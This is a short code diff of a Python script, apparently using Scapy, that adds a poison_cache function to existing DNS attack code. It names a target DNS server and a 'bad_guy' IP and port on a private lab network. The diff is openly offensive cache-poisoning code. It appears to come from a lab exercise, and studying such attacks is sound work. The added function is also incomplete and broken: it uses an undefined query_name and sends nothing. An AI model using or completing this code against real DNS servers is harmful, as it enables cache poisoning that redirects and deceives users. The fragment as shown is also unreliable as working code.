@@ -16,6 +16,9 @@ def launch_dns_attack(destination_ip, destination_port,query_name, is_finished):
         time.sleep(1)
 def manage_answer(answer):
         print(answer[DNS].show())
+def poison_cache(destination_ip, destination_port, is_finished):
+        while not is_finished[0]:
+                dns_req = IP(dst=destination_ip)/UDP(dport=destination_port)/DNS(rd=1, qd=DNSQR(qname=query_name))       
 dns_to_attack_ip = "192.168.56.101"
 bad_guy_ip = "192.168.56.1"
 bad_guy_port = 55553
